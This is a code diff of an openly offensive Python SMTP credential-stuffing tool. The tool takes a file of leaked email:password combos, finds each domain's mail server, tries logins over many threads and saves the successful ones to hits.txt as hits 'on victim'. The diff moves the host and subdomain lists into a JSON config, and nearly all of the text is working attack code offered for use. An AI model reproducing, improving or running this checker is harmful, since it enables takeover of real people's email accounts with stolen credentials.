@@ -11,6 +11,7 @@ import ctypes, os, smtplib, socket, sys, ssl, threading, time
 from time import sleep
 import colorama
 from colorama import *
+import json
 init()
 print(Fore.GREEN + Style.BRIGHT + '')
 
@@ -35,6 +36,9 @@ logo2 = '''
           DONATIONS (BTC): 1M8PrpZ3VFHuGrnYJk63MtoEmoJxwiUxYf
 '''
 
+
+
+
 #((--> *V*A*R*I*A*B*L*E*S***E*T*C* <--))
 combofile = ''
 combos = []
@@ -43,211 +47,220 @@ skip = 1
 freddys = int(5)
 valid = 0
 bad = 0
-hosters = {'gmail.com':'smtp.gmail.com','outlook.com':'smtp.live.com','office.com':'smtp.office365.com',
-           'yahoo.com':'smtp.mail.yahoo.com','yahoo.co.uk':'smtp.mail.yahoo.co.uk','yahoo.de':'smtp.mail.yahoo.com',
-           'aol.com':'smtp.aol.com','att.com':'smtp.att.yahoo.com','ntlworld.com':'smtp.ntlworld.com',
-           'btconnect.com':'mail.btconnect.com','orange.co.uk':'smtp.orange.co.uk','wanadoo.co.uk':'smtp.wanadoo.co.uk',
-           'o2online.de':'mail.o2online.de','t-online.de':'securesmtp.t-online.de','1and1.com':'smtp.1and1.com',
-           '1und1.de':'smtp.1und1.de','comcast.net':'smtp.comcast.net','verizon.net':'outgoing.verizon.net',
-           'mail.com':'smtp.mail.com','gmx.com':'smtp.gmx.com','gmx.de':'smtp.gmx.de','gmx.net':'smtp.gmx.net'}
-subh = ['','mail.','webmail.','smtp.','mail2.','mx.','email.','mail1.','owa.','mx1.','exchange.','smtpauths.',
-        'smtpauth.','smtp.mail.','smtp-mail.','securesmtp.']
-subp = ['587','465','25']
-blacklisted = ['gmail.com','googlemail.com','yahoo.com','hotmail.com','protonmail.com','yandex.ru']
 
-#((--> *F*U*N*C*T*I*O*N*S* <--))
-#cleaner == clears screen on purpose:
-def cleaner():
-    try:
-        if os.name == 'nt':
-            os.system('cls')
-        else:
-            os.system('clear')
-    except:
-        pass
+# included a json config file to make it easy to add more host and subdomain
 
-#hits == saves hits to a txt file:
-def hits(hitstext):
-    with open('hits.txt', 'a') as hitsfile:
-        hitsfile.write(hitstext + '\n')
-        hitsfile.close()
+try:   # trying to make sure config is available before i continue
+    with open('config.json') as config:
+        jsonobj = json.load(config)
 
-#skips == saves skipped combos to a txt file:
-def skips(skiptext):
-    with open('skipped.txt', 'a') as skippedfile:
-        skippedfile.write(skiptext + '\n')
-        skippedfile.close()
 
-#blackcheck == searches for smtp domain in blacklist:
-def blackcheck(search):
-    try:
-        x = int(blacklisted.count(str(search)))
-        if x == 0:
-            return False
-        else:
-            return True
-    except:
-        pass
+    hosters = (jsonobj['hosters'])
+    subh = (jsonobj['subh'])
+    subp = (jsonobj['subp'])
+    blacklisted = (jsonobj['blacklisted'])
 
-#finder == search for unknown smtp hosts:
-#TODO: make more verbose, add port for SMTP (...)
-def finder(unkdom):
-    socket.setdefaulttimeout(tout)
-    z = ''
-    print(Fore.LIGHTYELLOW_EX + Style.BRIGHT + 'Trying to find SMTP-host for: ' + str(unkdom) + '\n')
-    try:
-        for x in subh:
-            y = str(x) + str(unkdom)
-            try:
-                findsmtp = smtplib.SMTP_SSL(str(y))
-                findsmtp.close()
-                z = str(y)
-            except:
+
+
+    #((--> *F*U*N*C*T*I*O*N*S* <--))
+
+
+    #cleaner == clears screen on purpose:
+    def cleaner():
+        try:
+            if os.name == 'nt':
+                os.system('cls')
+            else:
+                os.system('clear')
+        except:
+            pass
+
+    #hits == saves hits to a txt file:
+    def hits(hitstext):
+        with open('hits.txt', 'a') as hitsfile:
+            hitsfile.write(hitstext + '\n')
+            hitsfile.close()
+
+    #skips == saves skipped combos to a txt file:
+    def skips(skiptext):
+        with open('skipped.txt', 'a') as skippedfile:
+            skippedfile.write(skiptext + '\n')
+            skippedfile.close()
+
+    #blackcheck == searches for smtp domain in blacklist:
+    def blackcheck(search):
+        try:
+            x = int(blacklisted.count(str(search)))
+            if x == 0:
+                return False
+            else:
+                return True
+        except:
+            pass
+
+    #finder == search for unknown smtp hosts:
+    #TODO: make more verbose, add port for SMTP (...)
+    def finder(unkdom):
+        socket.setdefaulttimeout(tout)
+        z = ''
+        print(Fore.LIGHTYELLOW_EX + Style.BRIGHT + 'Trying to find SMTP-host for: ' + str(unkdom) + '\n')
+        try:
+            for x in subh:
+                y = str(x) + str(unkdom)
                 try:
-                    findsmtp = smtplib.SMTP(str(y))
+                    findsmtp = smtplib.SMTP_SSL(str(y))
                     findsmtp.close()
                     z = str(y)
                 except:
-                    continue
-        return z
-    except BaseException:
-        z = None
-        return z
+                    try:
+                        findsmtp = smtplib.SMTP(str(y))
+                        findsmtp.close()
+                        z = str(y)
+                    except:
+                        continue
+            return z
+        except BaseException:
+            z = None
+            return z
 
-#checkmate == the main checker based on smtplib:
-#TODO: Improve with SMTP ports, SSL support, probably SOCKS proxys (...)
-def checkmate():
-    global valid
-    global bad
-    socket.setdefaulttimeout(tout)
-    while len(combos) > 0:
-        try:
-            l = combos.pop(0).split(":")
-            if skip == 1:
-                blackhost = blackcheck(str(l[0].split("@")[1]))
-                if blackhost == True:
-                    skips(l[0] + ':' + l[1])
-                    print(Fore.LIGHTRED_EX + Style.BRIGHT + 'BAD LUCK, SKIPPED: ' + str(l[0]) + ':' + str(l[1]) + '.\n')
-                    bad += 1
-                    continue
-                else:
-                    pass
+    #checkmate == the main checker based on smtplib:
+    #TODO: Improve with SMTP ports, SSL support, probably SOCKS proxys (...)
+    def checkmate():
+        global valid
+        global bad
+        socket.setdefaulttimeout(tout)
+        while len(combos) > 0:
             try:
-                targethost = hosters[str(l[0].split("@")[1])]
-            except:
-                try:
-                    newhost = finder(str(l[0].split("@")[1]))
-                    if newhost == None:
-                        print(Fore.LIGHTRED_EX + Style.BRIGHT + 'SORRY, NO HOST FOUND FOR: ' + str(l[0]) + ':' + str(l[1]) + '.\n')
+                l = combos.pop(0).split(":")
+                if skip == 1:
+                    blackhost = blackcheck(str(l[0].split("@")[1]))
+                    if blackhost == True:
                         skips(l[0] + ':' + l[1])
+                        print(Fore.LIGHTRED_EX + Style.BRIGHT + 'BAD LUCK, SKIPPED: ' + str(l[0]) + ':' + str(l[1]) + '.\n')
+                        bad += 1
                         continue
                     else:
-                        targethost = str(newhost)
-                except:
-                    pass
-            try:
-                attack = smtplib.SMTP_SSL(str(targethost))
-                attack.ehlo()
-            except:
+                        pass
                 try:
-                    attack = smtplib.SMTP(str(targethost))
+                    targethost = hosters[str(l[0].split("@")[1])]
+                except:
+                    try:
+                        newhost = finder(str(l[0].split("@")[1]))
+                        if newhost == None:
+                            print(Fore.LIGHTRED_EX + Style.BRIGHT + 'SORRY, NO HOST FOUND FOR: ' + str(l[0]) + ':' + str(l[1]) + '.\n')
+                            skips(l[0] + ':' + l[1])
+                            continue
+                        else:
+                            targethost = str(newhost)
+                    except:
+                        pass
+                try:
+                    attack = smtplib.SMTP_SSL(str(targethost))
                     attack.ehlo()
                 except:
-                    print(Fore.LIGHTRED_EX + Style.BRIGHT + 'CONNECTION ERROR FOR: ' + str(l[0]) + ' | ' + str(l[1]) + '.\n')
-                    bad += 1
-                    continue
-            try:
-                attack.starttls()
-                attack.ehlo()
+                    try:
+                        attack = smtplib.SMTP(str(targethost))
+                        attack.ehlo()
+                    except:
+                        print(Fore.LIGHTRED_EX + Style.BRIGHT + 'CONNECTION ERROR FOR: ' + str(l[0]) + ' | ' + str(l[1]) + '.\n')
+                        bad += 1
+                        continue
+                try:
+                    attack.starttls()
+                    attack.ehlo()
+                except:
+                    pass
+                attack.login(str(l[0]), str(l[1]))
+                print(Fore.LIGHTGREEN_EX + Style.BRIGHT + 'HIT ON VICTIM --> USER: ' + str(l[0]) + ', PASS: ' + str(l[1]) + '.\n')
+                hits('SERVER: ' + str(targethost) + ', USER: ' + str(l[0]) + ', PASS: ' + str(l[1]))
+                try:
+                    attack.close()
+                except:
+                    pass
+                valid += 1
             except:
-                pass
-            attack.login(str(l[0]), str(l[1]))
-            print(Fore.LIGHTGREEN_EX + Style.BRIGHT + 'HIT ON VICTIM --> USER: ' + str(l[0]) + ', PASS: ' + str(l[1]) + '.\n')
-            hits('SERVER: ' + str(targethost) + ', USER: ' + str(l[0]) + ', PASS: ' + str(l[1]))
-            try:
-                attack.close()
-            except:
-                pass
-            valid += 1
-        except:
-            print(Fore.LIGHTRED_EX + Style.BRIGHT + 'SORRY, NO HIT FOR : ' + str(l[0]) + ' | ' + str(l[1]) + '\n')
-            bad += 1
+                print(Fore.LIGHTRED_EX + Style.BRIGHT + 'SORRY, NO HIT FOR : ' + str(l[0]) + ' | ' + str(l[1]) + '\n')
+                bad += 1
 
-#((<-- *M*A*I*N***P*R*O*G*R*A*M*M* -->))
-#startup on clean screen with logos:
-cleaner()
-print(Fore.LIGHTGREEN_EX + Style.BRIGHT + logo1)
-print(Fore.LIGHTRED_EX + Style.BRIGHT + logo2)
-
-#ask for name of combofile:
-combofile = input(Fore.LIGHTWHITE_EX + 'Enter name of your combofile, e.g. combos.txt :     ')
-
-#check combofile:
-if combofile == '':
+    #((<-- *M*A*I*N***P*R*O*G*R*A*M*M* -->))
+    #startup on clean screen with logos:
     cleaner()
-    sys.exit(Fore.LIGHTRED_EX + Style.BRIGHT + '\nNo filename entered. Bye bye!\n')
-else:
-    try:
-        combos = open(combofile, 'r').read().splitlines()
-    except:
+    print(Fore.LIGHTGREEN_EX + Style.BRIGHT + logo1)
+    print(Fore.LIGHTRED_EX + Style.BRIGHT + logo2)
+
+    #ask for name of combofile:
+    combofile = input(Fore.LIGHTWHITE_EX + 'Enter name of your combofile, e.g. combos.txt :     ')
+
+    #check combofile:
+    if combofile == '':
         cleaner()
-        sys.exit(Fore.LIGHTRED_EX + Style.BRIGHT + '\nCombofile not found. Check filename and start again!\n')
+        sys.exit(Fore.LIGHTRED_EX + Style.BRIGHT + '\nNo filename entered. Bye bye!\n')
+    else:
+        try:
+            combos = open(combofile, 'r').read().splitlines()
+        except:
+            cleaner()
+            sys.exit(Fore.LIGHTRED_EX + Style.BRIGHT + '\nCombofile not found. Check filename and start again!\n')
 
-#return amount of combos to check:
-tocheck = len(combos)
-if tocheck == 0:
-    sys.exit(Fore.LIGHTRED_EX + Style.BRIGHT + '\nCombofile is empty. Bye bye!\n')
-else:
-    print(Fore.LIGHTGREEN_EX + Style.BRIGHT + '\nFound ' + str(tocheck) + ' combos to check ...\n')
+    #return amount of combos to check:
+    tocheck = len(combos)
+    if tocheck == 0:
+        sys.exit(Fore.LIGHTRED_EX + Style.BRIGHT + '\nCombofile is empty. Bye bye!\n')
+    else:
+        print(Fore.LIGHTGREEN_EX + Style.BRIGHT + '\nFound ' + str(tocheck) + ' combos to check ...\n')
 
-#ask for default timeout:
-try:
-    tout = float(input(Fore.LIGHTWHITE_EX + '\nEnter value of timeout (any key for default = 5.0) :     '))
-except:
-    tout = float(5.0)
-print(Fore.LIGHTGREEN_EX + Style.BRIGHT + '\nDefault timeout set to: ' + str(tout) + ' ...\n')
-
-#ask for amount of threads to use:
-try:
-    freddys = int(input(Fore.LIGHTWHITE_EX + '\nEnter amount of threads to use (any key for default = 5) :     '))
-except:
-    freddys = int(5)
-print(Fore.LIGHTGREEN_EX + Style.BRIGHT + '\nAmount of threads set to: ' + str(freddys) + ' ...\n')
-
-#ask for skipping options:
-skipuser = input(Fore.LIGHTWHITE_EX + '\nDo you want to skip services like GMAIL (yes / no, any key for default = yes) :    ')
-if skipuser == 'no':
-    skip = 0
-elif skipuser == 'n':
-    skip = 0
-else:
-    skip = 1
-if skip == 0:
-    print(Fore.LIGHTRED_EX + Style.BRIGHT + '\nWARNING: Services like GMAIL etc. will not be skipped! You probably waste your time ...\n')
-else:
-    print(Fore.LIGHTGREEN_EX + Style.BRIGHT + '\nCombos for GMAIL etc. will be skipped and saved to a txt-file ...\n')
-
-#ask to start checking:
-startnow = input(Fore.LIGHTWHITE_EX + '\nDO YOU WANT TO START THE CHECKER NOW? (yes / no) :     ')
-if startnow == 'no':
-    cleaner()
-    sys.exit(Fore.LIGHTRED_EX + Style.BRIGHT + '\n... hm, Simon said NO. OK, bye bye!\n')
-elif startnow == 'n':
-    cleaner()
-    sys.exit(Fore.LIGHTRED_EX + Style.BRIGHT + '\n... hm, Simon said NO. OK, bye bye!\n')
-else:
-    pass
-
-#start checker:
-cleaner()
-print(Fore.LIGHTGREEN_EX + Style.BRIGHT + 'YOUR GUN IS LOADED!\nLet us start shooting at your victims now  ...\n\n')
-for _ in range(freddys):
-    threading.Thread(target=checkmate).start()
-while len(combos) > 0:
+    #ask for default timeout:
     try:
-        #Show stats in title bar if run on Windows:
-        sleep(0.1)
-        ctypes.windll.kernel32.SetConsoleTitleW(f"TO CHECK: {str(len(combos))} | HITS: {str(valid)} | BAD: {str(bad)}")
-    #Skip stats in title bar on any other OS:
+        tout = float(input(Fore.LIGHTWHITE_EX + '\nEnter value of timeout (any key for default = 5.0) :     '))
     except:
+        tout = float(5.0)
+    print(Fore.LIGHTGREEN_EX + Style.BRIGHT + '\nDefault timeout set to: ' + str(tout) + ' ...\n')
+
+    #ask for amount of threads to use:
+    try:
+        freddys = int(input(Fore.LIGHTWHITE_EX + '\nEnter amount of threads to use (any key for default = 5) :     '))
+    except:
+        freddys = int(5)
+    print(Fore.LIGHTGREEN_EX + Style.BRIGHT + '\nAmount of threads set to: ' + str(freddys) + ' ...\n')
+
+    #ask for skipping options:
+    skipuser = input(Fore.LIGHTWHITE_EX + '\nDo you want to skip services like GMAIL (yes / no, any key for default = yes) :    ')
+    if skipuser == 'no':
+        skip = 0
+    elif skipuser == 'n':
+        skip = 0
+    else:
+        skip = 1
+    if skip == 0:
+        print(Fore.LIGHTRED_EX + Style.BRIGHT + '\nWARNING: Services like GMAIL etc. will not be skipped! You probably waste your time ...\n')
+    else:
+        print(Fore.LIGHTGREEN_EX + Style.BRIGHT + '\nCombos for GMAIL etc. will be skipped and saved to a txt-file ...\n')
+
+    #ask to start checking:
+    startnow = input(Fore.LIGHTWHITE_EX + '\nDO YOU WANT TO START THE CHECKER NOW? (yes / no) :     ')
+    if startnow == 'no':
+        cleaner()
+        sys.exit(Fore.LIGHTRED_EX + Style.BRIGHT + '\n... hm, Simon said NO. OK, bye bye!\n')
+    elif startnow == 'n':
+        cleaner()
+        sys.exit(Fore.LIGHTRED_EX + Style.BRIGHT + '\n... hm, Simon said NO. OK, bye bye!\n')
+    else:
         pass
+
+    #start checker:
+    cleaner()
+    print(Fore.LIGHTGREEN_EX + Style.BRIGHT + 'YOUR GUN IS LOADED!\nLet us start shooting at your victims now  ...\n\n')
+    for _ in range(freddys):
+        threading.Thread(target=checkmate).start()
+    while len(combos) > 0:
+        try:
+            #Show stats in title bar if run on Windows:
+            sleep(0.1)
+            ctypes.windll.kernel32.SetConsoleTitleW(f"TO CHECK: {str(len(combos))} | HITS: {str(valid)} | BAD: {str(bad)}")
+        #Skip stats in title bar on any other OS:
+        except:
+            pass
+
+except:
+    print('No input or config.json not found\nClosing and Goodbye ****************** ')
+    time.sleep(5)
